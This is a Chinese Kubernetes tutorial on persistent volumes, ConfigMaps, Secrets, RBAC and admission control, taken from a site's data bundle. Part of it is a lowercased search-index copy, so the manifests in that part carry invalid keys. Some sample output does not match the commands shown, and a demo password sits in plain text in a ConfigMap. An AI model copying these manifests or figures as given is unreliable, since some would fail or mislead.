192.168.5.6\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\n# 创建 pv\n[root@k8s-master01 ~]# kubectl create -f pv.yaml\npersistentvolume/pv1 created\npersistentvolume/pv2 created\npersistentvolume/pv3 created\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nname   capacity   access modes  reclaim policy  status      age   volumemode\npv1    1gi        rwx            retain        available    10s   filesystem\npv2    2gi        rwx            retain        available    10s   filesystem\npv3    3gi        rwx            retain        available    9s    filesystem\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# pvc\n\npvc 是资源的申请，用来声明对存储空间、访问模式、存储类别需求信息。下面是资源清单文件:\n\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc\n  namespace: dev\nspec:\n  accessmodes: # 访问模式\n  selector: # 采用标签对pv选择\n  storageclassname: # 存储类别\n  resources: # 请求空间\n    requests:\n      storage: 5gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\npvc 的关键配置参数说明：\n\n * 访问模式（accessmodes）\n   用于描述用户应用对存储资源的访问权限\n * 选择条件（selector）\n   通过 label selector 的设置，可使 pvc 对于系统中己存在的 pv 进行筛选\n * 存储类别（storageclassname）\n   pvc 在定义时可以设定需要的后端存储的类别，只有设置了该 class 的 pv 才能被系统选出\n * 资源请求（resources ）\n   描述对存储资源的请求\n\n实验\n1. 创建 pvc.yaml，申请 pv\n\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc1\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n---\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc2\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n---\napiversion: v1\nkind: persistentvolumeclaim\nmetadata:\n  name: pvc3\n  namespace: dev\nspec:\n  accessmodes: \n  - readwritemany\n  resources:\n    requests:\n      storage: 1gi\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n# 创建pvc\n[root@k8s-master01 ~]# kubectl create -f pvc.yaml\npersistentvolumeclaim/pvc1 created\npersistentvolumeclaim/pvc2 created\npersistentvolumeclaim/pvc3 created\n\n# 查看pvc\n[root@k8s-master01 ~]# kubectl get pvc  -n dev -o wide\nname   status   volume   capacity   access modes   storageclass   age   volumemode\npvc1   bound    pv1      1gi        rwx                           15s   filesystem\npvc2   bound    pv2      2gi        rwx                           15s   filesystem\npvc3   bound    pv3      3gi        rwx                           15s   filesystem\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -o wide\nname  capacity access modes  reclaim policy  status    claim       age     volumemode\npv1    1gi        rwx        retain          bound    dev/pvc1    3h37m    filesystem\npv2    2gi        rwx        retain          bound    dev/pvc2    3h37m    filesystem\npv3    3gi        rwx        retain          bound    dev/pvc3    3h37m    filesystem   \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n2. 创建 pods.yaml, 使用 pv\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod1\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod1 >> /root/out.txt; sleep 10; done;"]\n    volumemounts:\n    - name: volume\n      mountpath: /root/\n  volumes:\n    - name: volume\n      persistentvolumeclaim:\n        claimname: pvc1\n        readonly: false\n---\napiversion: v1\nkind: pod\nmetadata:\n  name: pod2\n  namespace: dev\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.30\n    command: ["/bin/sh","-c","while true;do echo pod2 >> /root/out.txt; sleep 10; done;"]\n    volumemounts:\n    - name: volume\n      mountpath: /root/\n  volumes:\n    - name: volume\n      persistentvolumeclaim:\n        claimname: pvc2\n        readonly: false\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pods.yaml\npod/pod1 created\npod/pod2 created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname   ready   status    restarts   age   ip            node   \npod1   1/1     running   0          14s   10.244.1.69   node1   \npod2   1/1     running   0          14s   10.244.1.70   node1  \n\n# 查看pvc\n[root@k8s-master01 ~]# kubectl get pvc -n dev -o wide\nname   status   volume   capacity   access modes      age   volumemode\npvc1   bound    pv1      1gi        rwx               94m   filesystem\npvc2   bound    pv2      2gi        rwx               94m   filesystem\npvc3   bound    pv3      3gi        rwx               94m   filesystem\n\n# 查看pv\n[root@k8s-master01 ~]# kubectl get pv -n dev -o wide\nname   capacity   access modes   reclaim policy   status   claim       age     volumemode\npv1    1gi        rwx            retain           bound    dev/pvc1    5h11m   filesystem\npv2    2gi        rwx            retain           bound    dev/pvc2    5h11m   filesystem\npv3    3gi        rwx            retain           bound    dev/pvc3    5h11m   filesystem\n\n# 查看nfs中的文件存储\n[root@nfs ~]# more /root/data/pv1/out.txt\nnode1\nnode1\n[root@nfs ~]# more /root/data/pv2/out.txt\nnode2\nnode2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 生命周期\n\npvc 和 pv 是一一对应的，pv 和 pvc 之间的相互作用遵循以下生命周期：\n\n * 资源供应：管理员手动创建底层存储和 pv\n * 资源绑定：用户创建 pvc，kubernetes 负责根据 pvc 的声明去寻找 pv，并绑定\n   在用户定义好 pvc 之后，系统将根据 pvc 对存储资源的请求在已存在的 pv 中选择一个满足条件的\n   * 一旦找到，就将该 pv 与用户定义的 pvc 进行绑定，用户的应用就可以使用这个 pvc 了\n   * 如果找不到，pvc 则会无限期处于 pending 状态，直到等到系统管理员创建了一个符合其要求的 pv\n     pv一旦绑定到某个pvc上，就会被这个pvc独占，不能再与其他pvc进行绑定了\n * 资源使用：用户可在 pod 中像 volume 一样使用 pvc\n   pod 使用 volume 的定义，将 pvc 挂载到容器内的某个路径进行使用。\n * 资源释放：用户删除 pvc 来释放 pv\n   当存储资源使用完毕后，用户可以删除 pvc，与该 pvc 绑定的 pv 将会被标记为 “已释放”，但还不能立刻与其他 pvc 进行绑定。通过之前 pvc 写入的数据可能还被留在存储设备上，只有在清除之后该 pv 才能再次使用。\n * 资源回收：kubernetes 根据 pv 设置的回收策略进行资源的回收\n   对于 pv，管理员可以设定回收策略，用于设置与之绑定的 pvc 释放资源之后如何处理遗留数据的问题。只有 pv 的存储空间完成回收，才能供新的 pvc 绑定和使用\n\n\n\n\n# 配置存储\n\n\n# configmap\n\nconfigmap 是一种比较特殊的存储卷，它的主要作用是用来存储配置信息的。\n\n创建 configmap.yaml，内容如下：\n\napiversion: v1\nkind: configmap\nmetadata:\n  name: configmap\n  namespace: dev\ndata:\n  info: |\n    username:admin\n    password:123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n接下来，使用此配置文件创建 configmap\n\n# 创建configmap\n[root@k8s-master01 ~]# kubectl create -f configmap.yaml\nconfigmap/configmap created\n\n# 查看configmap详情\n[root@k8s-master01 ~]# kubectl describe cm configmap -n dev\nname:         configmap\nnamespace:    dev\nlabels:       <none>\nannotations:  <none>\n\ndata\n====\ninfo:\n----\nusername:admin\npassword:123456\n\nevents:  <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n接下来创建一个 pod-configmap.yaml，将上面创建的 configmap 挂载进去\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-configmap\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumemounts: # 将configmap挂载到目录\n    - name: config\n      mountpath: /configmap/config\n  volumes: # 引用configmap\n  - name: config\n    configmap:\n      name: configmap\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-configmap.yaml\npod/pod-configmap created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pod pod-configmap -n dev\nname            ready   status    restarts   age\npod-configmap   1/1     running   0          6s\n\n#进入容器\n[root@k8s-master01 ~]# kubectl exec -it pod-configmap -n dev /bin/sh\n# cd /configmap/config/\n# ls\ninfo\n# more info\nusername:admin\npassword:123456\n\n# 可以看到映射已经成功，每个configmap都映射成了一个目录\n# key---\x3e文件     value----\x3e文件中的内容\n# 此时如果更新configmap的内容, 容器中的值也会动态更新\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# secret\n\n在 kubernetes 中，还存在一种和 configmap 非常类似的对象，称为 secret 对象。它主要用于存储敏感信息，例如密码、秘钥、证书等等。\n\n1. 首先使用 base64 对数据进行编码\n\n[root@k8s-master01 ~]# echo -n \'admin\' | base64 #准备username\nywrtaw4=\n[root@k8s-master01 ~]# echo -n \'123456\' | base64 #准备password\nmtizndu2\n\n\n1\n2\n3\n4\n\n\n2. 接下来编写 secret.yaml，并创建 secret\n\napiversion: v1\nkind: secret\nmetadata:\n  name: secret\n  namespace: dev\ntype: opaque\ndata:\n  username: ywrtaw4=\n  password: mtizndu2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# 创建secret\n[root@k8s-master01 ~]# kubectl create -f secret.yaml\nsecret/secret created\n\n# 查看secret详情\n[root@k8s-master01 ~]# kubectl describe secret secret -n dev\nname:         secret\nnamespace:    dev\nlabels:       <none>\nannotations:  <none>\ntype:  opaque\ndata\n====\npassword:  6 bytes\nusername:  5 bytes\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n3. 创建 pod-secret.yaml，将上面创建的 secret 挂载进去：\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-secret\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n    volumemounts: # 将secret挂载到目录\n    - name: config\n      mountpath: /secret/config\n  volumes:\n  - name: config\n    secret:\n      secretname: secret\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 创建pod\n[root@k8s-master01 ~]# kubectl create -f pod-secret.yaml\npod/pod-secret created\n\n# 查看pod\n[root@k8s-master01 ~]# kubectl get pod pod-secret -n dev\nname            ready   status    restarts   age\npod-secret      1/1     running   0          2m28s\n\n# 进入容器，查看secret信息，发现已经自动解码了\n[root@k8s-master01 ~]# kubectl exec -it pod-secret /bin/sh -n dev\n/ # ls /secret/config/\npassword  username\n/ # more /secret/config/username\nadmin\n/ # more /secret/config/password\n123456\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n至此，已经实现了利用 secret 实现了信息的编码。',charsets:{cjk:!0}},{title:"kubernetes(十二) 安全认证",frontmatter:{title:"kubernetes(十二) 安全认证",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/611",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/611.kubernetes(%E5%8D%81%E4%BA%8C)%20%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81.html",relativePath:"04.运维/60.Kubernetes/611.kubernetes(十二) 安全认证.md",key:"v-3a5a1361",path:"/kubernetes/611/",headers:[{level:2,title:"访问控制概述",slug:"访问控制概述",normalizedTitle:"访问控制概述",charIndex:2},{level:2,title:"认证管理",slug:"认证管理",normalizedTitle:"认证管理",charIndex:467},{level:2,title:"授权管理",slug:"授权管理",normalizedTitle:"授权管理",charIndex:1201},{level:2,title:"准入控制",slug:"准入控制",normalizedTitle:"准入控制",charIndex:262}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"访问控制概述 认证管理 授权管理 准入控制",content:'# 访问控制概述\n\nKubernetes 作为一个分布式集群的管理工具，保证集群的安全性是其一个重要的任务。所谓的安全性其实就是保证对 Kubernetes 的各种客户端进行认证和鉴权操作。\n\n客户端\n在 Kubernetes 集群中，客户端通常有两类：\n\n * User Account：一般是独立于 kubernetes 之外的其他服务管理的用户账号。\n * Service Account：kubernetes 管理的账号，用于为 Pod 中的服务进程在访问 Kubernetes 时提供身份标识。\n\n\n\n认证、授权与准入控制\nApiServer 是访问及管理资源对象的唯一入口。任何一个请求访问 ApiServer，都要经过下面三个流程：\n\n * Authentication（认证）：身份鉴别，只有正确的账号才能够通过认证\n * Authorization（授权）： 判断用户是否有权限对访问的资源执行特定的动作\n * Admission Control（准入控制）：用于补充授权机制以实现更加精细的访问控制功能。\n\n\n# 认证管理\n\nKubernetes 集群安全的最关键点在于如何识别并认证客户端身份，它提供了 3 种客户端身份认证方式：\n\n * HTTP Base 认证：通过用户名 + 密码的方式认证\n\n> 这种认证方式是把 “用户名：密码” 用 BASE64 算法进行编码后的字符串放在 HTTP 请求中的 Header Authorization 域里发送给服务端。服务端收到后进行解码，获取用户名及密码，然后进行用户身份认证的过程。\n\n * HTTPS 证书认证：基于 CA 根证书签名的双向数字证书认证方式\n\n> 这种认证方式是安全性最高的一种方式，但是同时也是操作起来最麻烦的一种方式。\n\n\n\nHTTPS 认证大体分为 3 个过程：\n1. 证书申请和下发\n\n> HTTPS 通信双方的服务器向 CA 机构申请证书，CA 机构下发根证书、服务端证书及私钥给申请者\n\n2. 客户端和服务端的双向认证\n\n> 1> 客户端向服务器端发起请求，服务端下发自己的证书给客户端，\n> 客户端接收到证书后，通过私钥解密证书，在证书中获得服务端的公钥，\n> 客户端利用服务器端的公钥认证证书中的信息，如果一致，则认可这个服务器\n> 2> 客户端发送自己的证书给服务器端，服务端接收到证书后，通过私钥解密证书，\n> 在证书中获得客户端的公钥，并用该公钥认证证书信息，确认客户端是否合法\n\n3. 服务器端和客户端进行通信\n\n> 服务器端和客户端协商好加密方案后，客户端会产生一个随机的秘钥并加密，然后发送到服务器端。\n> 服务器端接收这个秘钥后，双方接下来通信的所有内容都通过该随机秘钥加密\n\n> 注意: Kubernetes 允许同时配置多种认证方式，只要其中任意一个方式认证通过即可\n\n\n# 授权管理\n\n授权发生在认证成功之后，通过认证就可以知道请求用户是谁， 然后 Kubernetes 会根据事先定义的授权策略来决定用户是否有权限访问，这个过程就称为授权。\n\n每个发送到 ApiServer 的请求都带上了用户和资源的信息：比如发送请求的用户、请求的路径、请求的动作等，授权就是根据这些信息和授权策略进行比较，如果符合策略，则认为授权通过，否则会返回错误。\n\nAPI Server 目前支持以下几种授权策略：\n\n * AlwaysDeny：表示拒绝所有请求，一般用于测试\n * AlwaysAllow：允许接收所有请求，相当于集群不需要授权流程（Kubernetes 默认的策略）\n * ABAC：基于属性的访问控制，表示使用用户配置的授权规则对用户请求进行匹配和控制\n * Webhook：通过调用外部 REST 服务对用户进行授权\n * Node：是一种专用模式，用于对 kubelet 发出的请求进行访问控制\n * RBAC：基于角色的访问控制（kubeadm 安装方式下的默认选项）\n\nRBAC (Role-Based Access Control) 基于角色的访问控制，主要是在描述一件事情：给哪些对象授予了哪些权限\n\n其中涉及到了下面几个概念：\n\n * 对象：User、Groups、ServiceAccount\n * 角色：代表着一组定义在资源上的可操作动作 (权限) 的集合\n * 绑定：将定义好的角色跟用户绑定在一起\n\n\n\nRBAC 引入了 4 个顶级资源对象：\n\n * Role、ClusterRole：角色，用于指定一组权限\n * RoleBinding、ClusterRoleBinding：角色绑定，用于将角色（权限）赋予给对象\n\nRole、ClusterRole\n一个角色就是一组权限的集合，这里的权限都是许可形式的（白名单）。\n\n# Role只能对命名空间内的资源进行授权，需要指定nameapce\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: authorization-role\nrules:\n- apiGroups: [""]  # 支持的API组列表,"" 空字符串，表示核心API群\n  resources: ["pods"] # 支持的资源对象列表\n  verbs: ["get", "watch", "list"] # 允许的对资源对象的操作方法列表\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# ClusterRole可以对集群范围内资源、跨namespaces的范围资源、非资源类型进行授权\nkind: ClusterRole\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole\nrules:\n- apiGroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n需要详细说明的是，rules 中的参数：\n\n * apiGroups: 支持的 API 组列表\n\n"","apps", "autoscaling", "batch"\n\n\n1\n\n * resources：支持的资源对象列表\n\n"services", "endpoints", "pods","secrets","configmaps","crontabs","deployments","jobs",\n"nodes","rolebindings","clusterroles","daemonsets","replicasets","statefulsets",\n"horizontalpodautoscalers","replicationcontrollers","cronjobs"\n\n\n1\n2\n3\n\n * verbs：对资源对象的操作方法列表\n\n"get", "list", "watch", "create", "update", "patch", "delete", "exec"\n\n\n1\n\n\nRoleBinding、ClusterRoleBinding\n角色绑定用来把一个角色绑定到一个目标对象上，绑定目标可以是 User、Group 或者 ServiceAccount。\n\n# RoleBinding可以将同一namespace中的subject绑定到某个Role下，则此subject即具有该Role定义的权限\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: authorization-role\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# ClusterRoleBinding在整个集群级别和所有namespaces将特定的subject与ClusterRole绑定，授予权限\nkind: ClusterRoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole-binding\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: authorization-clusterrole\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nRoleBinding 引用 ClusterRole 进行授权\nRoleBinding 可以引用 ClusterRole，对属于同一命名空间内 ClusterRole 定义的资源主体进行授权。\n\n> 一种很常用的做法就是，集群管理员为集群范围预定义好一组角色（ClusterRole），然后在多个命名空间中重复使用这些 ClusterRole。这样可以大幅提高授权管理工作效率，也使得各个命名空间下的基础性授权规则与使用体验保持一致。\n\n# 虽然authorization-clusterrole是一个集群角色，但是因为使用了RoleBinding\n# 所以heima只能读取dev命名空间中的资源\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding-ns\n  namespace: dev\nsubjects:\n- kind: User\n  name: heima\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: ClusterRole\n  name: authorization-clusterrole\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n实战：创建一个只能管理 dev 空间下 Pods 资源的账号\n1. 创建账号\n\n# 1) 创建证书\n[root@k8s-master01 pki]# cd /etc/kubernetes/pki/\n[root@k8s-master01 pki]# (umask 077;openssl genrsa -out devman.key 2048)\n\n# 2) 用apiserver的证书去签署\n# 2-1) 签名申请，申请的用户是devman,组是devgroup\n[root@k8s-master01 pki]# openssl req -new -key devman.key -out devman.csr -subj "/CN=devman/O=devgroup"     \n# 2-2) 签署证书\n[root@k8s-master01 pki]# openssl x509 -req -in devman.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out devman.crt -days 3650\n\n# 3) 设置集群、用户、上下文信息\n[root@k8s-master01 pki]# kubectl config set-cluster kubernetes --embed-certs=true --certificate-authority=/etc/kubernetes/pki/ca.crt --server=https://192.168.109.100:6443\n\n[root@k8s-master01 pki]# kubectl config set-credentials devman --embed-certs=true --client-certificate=/etc/kubernetes/pki/devman.crt --client-key=/etc/kubernetes/pki/devman.key\n\n[root@k8s-master01 pki]# kubectl config set-context devman@kubernetes --cluster=kubernetes --user=devman\n\n# 切换账户到devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nSwitched to context "devman@kubernetes".\n\n# 查看dev下pod，发现没有权限\n[root@k8s-master01 pki]# kubectl get pods -n dev\nError from server (Forbidden): pods is forbidden: User "devman" cannot list resource "pods" in API group "" in the namespace "dev"\n\n# 切换到admin账户\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nSwitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n2. 创建 Role 和 RoleBinding，为 devman 用户授权\n\nkind: Role\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: dev-role\nrules:\n- apiGroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n  \n---\n\nkind: RoleBinding\napiVersion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  name: authorization-role-binding\n  namespace: dev\nsubjects:\n- kind: User\n  name: devman\n  apiGroup: rbac.authorization.k8s.io\nroleRef:\n  kind: Role\n  name: dev-role\n  apiGroup: rbac.authorization.k8s.io\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n[root@k8s-master01 pki]# kubectl create -f dev-role.yaml\nrole.rbac.authorization.k8s.io/dev-role created\nrolebinding.rbac.authorization.k8s.io/authorization-role-binding created\n\n\n1\n2\n3\n\n\n3. 切换账户，再次验证\n\n# 切换账户到devman\n[root@k8s-master01 pki]# kubectl config use-context devman@kubernetes\nSwitched to context "devman@kubernetes".\n\n# 再次查看\n[root@k8s-master01 pki]# kubectl get pods -n dev\nNAME                                 READY   STATUS             RESTARTS   AGE\nnginx-deployment-66cb59b984-8wp2k    1/1     Running            0          4d1h\nnginx-deployment-66cb59b984-dc46j    1/1     Running            0          4d1h\nnginx-deployment-66cb59b984-thfck    1/1     Running            0          4d1h\n\n# 为了不影响后面的学习,切回admin账户\n[root@k8s-master01 pki]# kubectl config use-context kubernetes-admin@kubernetes\nSwitched to context "kubernetes-admin@kubernetes".\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# 准入控制\n\n通过了前面的认证和授权之后，还需要经过准入控制处理通过之后，apiserver 才会处理这个请求。\n\n准入控制是一个可配置的控制器列表，可以通过在 Api-Server 上通过命令行设置选择执行哪些准入控制器：\n\n--admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,\n                      DefaultStorageClass,ResourceQuota,DefaultTolerationSeconds\n\n\n1\n2\n\n\n只有当所有的准入控制器都检查通过之后，apiserver 才执行该请求，否则返回拒绝。\n\n当前可配置的 Admission Control 准入控制如下：\n\n * AlwaysAdmit：允许所有请求\n * AlwaysDeny：禁止所有请求，一般用于测试\n * AlwaysPullImages：在启动容器之前总去下载镜像\n * DenyExecOnPrivileged：它会拦截所有想在 Privileged Container 上执行命令的请求\n * ImagePolicyWebhook：这个插件将允许后端的一个 Webhook 程序来完成 admission controller 的功能。\n * Service Account：实现 ServiceAccount 实现了自动化\n * SecurityContextDeny：这个插件将使用 SecurityContext 的 Pod 中的定义全部失效\n * ResourceQuota：用于资源配额管理目的，观察所有请求，确保在 namespace 上的配额不会超标\n * LimitRanger：用于资源限制管理，作用于 namespace 上，确保对 Pod 进行资源限制\n * InitialResources：为未设置资源请求与限制的 Pod，根据其镜像的历史资源的使用情况进行设置\n * NamespaceLifecycle：如果尝试在一个不存在的 namespace 中创建资源对象，则该创建请求将被拒绝。当删除一个 namespace 时，系统将会删除该 namespace 中所有对象。\n * DefaultStorageClass：为了实现共享存储的动态供应，为未指定 StorageClass 或 PV 的 PVC 尝试匹配默认的 StorageClass，尽可能减少用户在申请 PVC 时所需了解的后端存储细节\n * DefaultTolerationSeconds：这个插件为那些没有设置 forgiveness tolerations 并具有 notready:NoExecute 和 unreachable:NoExecute 两种 taints 的 Pod 设置默认的 “容忍” 时间，为 5min\n * PodSecurityPolicy：这个插件用于在创建或修改 Pod 时决定是否根据 Pod 的 security context 和可用的 PodSecurityPolicy 对 Pod 的安全策略进行控制',normalizedContent:'# 访问控制概述\n\nkubernetes 作为一个分布式集群的管理工具，保证集群的安全性是其一个重要的任务。所谓的安全性其实就是保证对 kubernetes 的各种客户端进行认证和鉴权操作。\n\n客户端\n在 kubernetes 集群中，客户端通常有两类：\n\n * user account：一般是独立于 kubernetes 之外的其他服务管理的用户账号。\n * service account：kubernetes 管理的账号，用于为 pod 中的服务进程在访问 kubernetes 时提供身份标识。\n\n\n\n认证、授权与准入控制\napiserver 是访问及管理资源对象的唯一入口。任何一个请求访问 apiserver，都要经过下面三个流程：\n\n * authentication（认证）：身份鉴别，只有正确的账号才能够通过认证\n * authorization（授权）： 判断用户是否有权限对访问的资源执行特定的动作\n * admission control（准入控制）：用于补充授权机制以实现更加精细的访问控制功能。\n\n\n# 认证管理\n\nkubernetes 集群安全的最关键点在于如何识别并认证客户端身份，它提供了 3 种客户端身份认证方式：\n\n * http base 认证：通过用户名 + 密码的方式认证\n\n> 这种认证方式是把 “用户名：密码” 用 base64 算法进行编码后的字符串放在 http 请求中的 header authorization 域里发送给服务端。服务端收到后进行解码，获取用户名及密码，然后进行用户身份认证的过程。\n\n * https 证书认证：基于 ca 根证书签名的双向数字证书认证方式\n\n> 这种认证方式是安全性最高的一种方式，但是同时也是操作起来最麻烦的一种方式。\n\n\n\nhttps 认证大体分为 3 个过程：\n1. 证书申请和下发\n\n> https 通信双方的服务器向 ca 机构申请证书，ca 机构下发根证书、服务端证书及私钥给申请者\n\n2. 客户端和服务端的双向认证\n\n> 1> 客户端向服务器端发起请求，服务端下发自己的证书给客户端，\n> 客户端接收到证书后，通过私钥解密证书，在证书中获得服务端的公钥，\n> 客户端利用服务器端的公钥认证证书中的信息，如果一致，则认可这个服务器\n> 2> 客户端发送自己的证书给服务器端，服务端接收到证书后，通过私钥解密证书，\n> 在证书中获得客户端的公钥，并用该公钥认证证书信息，确认客户端是否合法\n\n3. 服务器端和客户端进行通信\n\n> 服务器端和客户端协商好加密方案后，客户端会产生一个随机的秘钥并加密，然后发送到服务器端。\n> 服务器端接收这个秘钥后，双方接下来通信的所有内容都通过该随机秘钥加密\n\n> 注意: kubernetes 允许同时配置多种认证方式，只要其中任意一个方式认证通过即可\n\n\n# 授权管理\n\n授权发生在认证成功之后，通过认证就可以知道请求用户是谁， 然后 kubernetes 会根据事先定义的授权策略来决定用户是否有权限访问，这个过程就称为授权。\n\n每个发送到 apiserver 的请求都带上了用户和资源的信息：比如发送请求的用户、请求的路径、请求的动作等，授权就是根据这些信息和授权策略进行比较，如果符合策略，则认为授权通过，否则会返回错误。\n\napi server 目前支持以下几种授权策略：\n\n * alwaysdeny：表示拒绝所有请求，一般用于测试\n * alwaysallow：允许接收所有请求，相当于集群不需要授权流程（kubernetes 默认的策略）\n * abac：基于属性的访问控制，表示使用用户配置的授权规则对用户请求进行匹配和控制\n * webhook：通过调用外部 rest 服务对用户进行授权\n * node：是一种专用模式，用于对 kubelet 发出的请求进行访问控制\n * rbac：基于角色的访问控制（kubeadm 安装方式下的默认选项）\n\nrbac (role-based access control) 基于角色的访问控制，主要是在描述一件事情：给哪些对象授予了哪些权限\n\n其中涉及到了下面几个概念：\n\n * 对象：user、groups、serviceaccount\n * 角色：代表着一组定义在资源上的可操作动作 (权限) 的集合\n * 绑定：将定义好的角色跟用户绑定在一起\n\n\n\nrbac 引入了 4 个顶级资源对象：\n\n * role、clusterrole：角色，用于指定一组权限\n * rolebinding、clusterrolebinding：角色绑定，用于将角色（权限）赋予给对象\n\nrole、clusterrole\n一个角色就是一组权限的集合，这里的权限都是许可形式的（白名单）。\n\n# role只能对命名空间内的资源进行授权，需要指定nameapce\nkind: role\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n  namespace: dev\n  name: authorization-role\nrules:\n- apigroups: [""]  # 支持的api组列表,"" 空字符串，表示核心api群\n  resources: ["pods"] # 支持的资源对象列表\n  verbs: ["get", "watch", "list"] # 允许的对资源对象的操作方法列表\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# clusterrole可以对集群范围内资源、跨namespaces的范围资源、非资源类型进行授权\nkind: clusterrole\napiversion: rbac.authorization.k8s.io/v1beta1\nmetadata:\n name: authorization-clusterrole\nrules:\n- apigroups: [""]\n  resources: ["pods"]\n  verbs: ["get", "watch", "list"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n需要详细说明的是，rules 中的参数：\n\n * apigroups: 支持的 api 组列表\n\n"","apps", "autoscaling", "batch"\n\n\n1\n\n * 